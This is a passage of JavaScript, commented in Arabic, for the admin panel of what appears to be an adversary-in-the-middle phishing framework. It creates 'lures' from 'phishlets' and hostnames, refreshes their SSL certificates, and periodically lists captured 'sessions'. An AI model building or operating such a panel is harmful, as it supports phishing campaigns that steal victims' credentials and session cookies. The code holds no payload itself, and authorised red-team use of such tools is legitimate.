                        <label for="lure-phishlet">Phishlet</label>
                        <select id="lure-phishlet" class="form-control" required>
                            <option value="">-- اختر Phishlet --</option>
                            ${phishlets.map(p => {
                                // التحقق من حالة التفعيل باستخدام جميع الاحتمالات الممكنة للحقل
                                const isActive = p.is_active === true || p.isActive === true || p.IsActive === true || p.enabled === true;
                                return `<option value="${p.name}" ${isActive ? '' : 'disabled'}>${p.name} ${isActive ? '' : '(معطل)'}</option>`;
                            }).join('')}
                        </select>
                    </div>
                    <div class="form-group">
                        <label for="lure-hostname">اسم المضيف (Hostname)</label>
                        <input type="text" id="lure-hostname" class="form-control" required>
                    </div>
                    <div class="form-group">
                        <label for="lure-path">المسار (اختياري)</label>
                        <input type="text" id="lure-path" class="form-control" placeholder="/login">
                    </div>
                </form>
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary modal-close-btn">إلغاء</button>
                <button class="btn btn-primary" id="submit-lure">إنشاء</button>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
    
    // إضافة معالجات الأحداث للإغلاق
    const closeButtons = modal.querySelectorAll('.modal-close, .modal-close-btn');
    closeButtons.forEach(button => {
        button.addEventListener('click', function() {
            document.body.removeChild(modal);
        });
    });
    
    // معالج الحدث لإرسال النموذج
    const submitButton = modal.querySelector('#submit-lure');
    submitButton.addEventListener('click', async function() {
        const phishlet = modal.querySelector('#lure-phishlet').value;
        const hostname = modal.querySelector('#lure-hostname').value;
        const path = modal.querySelector('#lure-path').value;
        
        if (!phishlet || !hostname) {
            showToast('خطأ', 'يرجى ملء جميع الحقول المطلوبة', 'error');
            return;
        }
        
        const lureData = {
            phishlet: phishlet,
            hostname: hostname,
            path: path || '/'
        };
        
        const result = await createLure(lureData);
        if (result) {
            document.body.removeChild(modal);
            
            // تحديث جدول الـ Lures
            const updatedLures = await fetchLures();
            populateLuresTable(updatedLures);
            
            // تحديث الإحصائيات
            updateDashboard();
            
            // تحديث شهادات SSL للطعم الجديد
            showToast('معلومات', 'تم إنشاء الطعم بنجاح. جاري تحديث شهادات SSL...', 'info');
            await updateCertificates();
        }
    });
}

// تنسيق التاريخ
function formatDate(dateString) {
    if (!dateString) return 'غير متوفر';
    
    try {
        // محاولة إنشاء كائن تاريخ
        const date = new Date(dateString);
        
        // التحقق من صحة التاريخ
        if (isNaN(date.getTime())) {
            return 'تاريخ غير صالح';
        }
        
        // تنسيق التاريخ بشكل صحيح
        return date.toLocaleString('ar-SA', {
            year: 'numeric',
            month: 'numeric',
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
    } catch (error) {
        console.error('خطأ في تنسيق التاريخ:', error);
        return 'تاريخ غير صالح';
    }
}

// ================= Event Handlers =================

// تبديل قائمة التنقل الجانبية
menuToggle.addEventListener('click', function() {
    sidebar.classList.toggle('active');
});

// التنقل بين التبويبات
navLinks.forEach(link => {
    link.addEventListener('click', function(e) {
        e.preventDefault();
        
        // إزالة الفئة النشطة من جميع الروابط
        document.querySelectorAll('.sidebar-nav a').forEach(a => {
            a.classList.remove('active');
        });
        
        // إضافة الفئة النشطة إلى الرابط الحالي
        this.classList.add('active');
        
        // إخفاء جميع محتويات التبويبات
        document.querySelectorAll('.tab-content').forEach(tab => {
            tab.style.display = 'none';
        });
        
        // إظهار محتوى التبويب المطلوب
        const targetId = this.getAttribute('data-target');
        const targetTab = document.getElementById(targetId);
        if (targetTab) {
            targetTab.style.display = 'block';
            
            // تحديث البيانات بناءً على التبويب النشط
            if (targetId === 'phishlets-tab') {
                fetchPhishlets().then(data => populatePhishletsTable(data));
            } else if (targetId === 'lures-tab') {
                fetchLures().then(data => populateLuresTable(data));
            } else if (targetId === 'sessions-tab') {
                fetchSessions().then(data => populateSessionsTable(data));
            } else if (targetId === 'dashboard-tab') {
                updateDashboard();
            }
        }
    });
});

// أزرار تحديث البيانات
phishletsRefreshBtn.addEventListener('click', function() {
    fetchPhishlets().then(data => {
        populatePhishletsTable(data);
        showToast('تم التحديث', 'تم تحديث قائمة الـ Phishlets بنجاح', 'success');
    });
});

luresRefreshBtn.addEventListener('click', function() {
    fetchLures().then(data => {
        populateLuresTable(data);
        showToast('تم التحديث', 'تم تحديث قائمة الـ Lures بنجاح', 'success');
    });
});

sessionsRefreshBtn.addEventListener('click', function() {
    fetchSessions().then(data => {
        populateSessionsTable(data);
        showToast('تم التحديث', 'تم تحديث قائمة الـ Sessions بنجاح', 'success');
    });
});

// زر تحديث شهادات SSL
const updateCertificatesBtn = document.getElementById('update-certificates-btn');
if (updateCertificatesBtn) {
    updateCertificatesBtn.addEventListener('click', function() {
        updateCertificates();
    });
}

// زر إنشاء Lure جديد
createLureBtn.addEventListener('click', showCreateLureModal);

// زر تسجيل الخروج
logoutBtn.addEventListener('click', function() {
    // حذف الـ token من التخزين المحلي
    localStorage.removeItem('authToken');
    // توجيه المستخدم إلى صفحة تسجيل الدخول
    window.location.href = '/login';
});

// تنفيذ طلب لتحديث شهادات SSL
async function updateCertificates() {
    try {
        showToast('جاري التنفيذ', 'جاري تحديث شهادات SSL...', 'info');
        
        const response = await fetch(`${API_BASE_URL}/config/certificates`, {
            method: 'POST',
            headers: getHeaders()
        });
        
        if (!response.ok) {
            throw new Error(`فشل في تحديث شهادات SSL: ${response.statusText}`);
        }
        
        const data = await response.json();
        console.log('استجابة تحديث الشهادات:', data);
        
        if (data.success) {
            showToast('تم بنجاح', data.message || 'تم تحديث شهادات SSL بنجاح', 'success');
            return true;
        } else {
            showToast('خطأ', data.message || 'فشل في تحديث شهادات SSL', 'error');
            return false;
        }
    } catch (error) {
        console.error('خطأ في تحديث شهادات SSL:', error);
        showToast('خطأ', `حدث خطأ: ${error.message}`, 'error');
        return false;
    }
}

// ================= Initialization =================

// تهيئة الصفحة عند التحميل
document.addEventListener('DOMContentLoaded', function() {
    // التحقق من حالة تسجيل الدخول
    checkAuthentication();
    
    // تحديث البيانات فور تحميل الصفحة
    updateDashboard();
    
    // تفعيل التبويب الافتراضي (لوحة القيادة)
    document.querySelector('.sidebar-nav li:first-child a').click();
    
    // إضافة معالج الأحداث للتبويبات
    document.querySelectorAll('.sidebar-nav a').forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            
            // إزالة الفئة النشطة من جميع الروابط
            document.querySelectorAll('.sidebar-nav a').forEach(a => {
                a.classList.remove('active');
            });
            
            // إضافة الفئة النشطة إلى الرابط الحالي
            this.classList.add('active');
            
            // إخفاء جميع محتويات التبويبات
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.style.display = 'none';
            });
            
            // إظهار محتوى التبويب المطلوب
            const targetId = this.getAttribute('data-target');
            const targetTab = document.getElementById(targetId);
            if (targetTab) {
                targetTab.style.display = 'block';
                
                // تحديث البيانات بناءً على التبويب النشط
                if (targetId === 'phishlets-tab') {
                    fetchPhishlets().then(data => populatePhishletsTable(data));
                } else if (targetId === 'lures-tab') {
                    fetchLures().then(data => populateLuresTable(data));
                } else if (targetId === 'sessions-tab') {
                    fetchSessions().then(data => populateSessionsTable(data));
                } else if (targetId === 'dashboard-tab') {
                    updateDashboard();
                }
            }
        });
    });
    
    // تحديث البيانات كل 30 ثانية
    setInterval(function() {
        // تحديث البيانات بناءً على التبويب النشط
        const activeTab = document.querySelector('.sidebar-nav a.active');
        if (activeTab) {
            const targetId = activeTab.getAttribute('data-target');
            if (targetId === 'phishlets-tab') {
                fetchPhishlets().then(data => populatePhishletsTable(data));
            } else if (targetId === 'lures-tab') {
                fetchLures().then(data => populateLuresTable(data));
            } else if (targetId === 'sessions-tab') {
                fetchSessions().then(data => populateSessionsTable(data));
            } else if (targetId === 'dashboard-tab') {
                updateDashboard();
            }
        }
    }, 30000);
}); 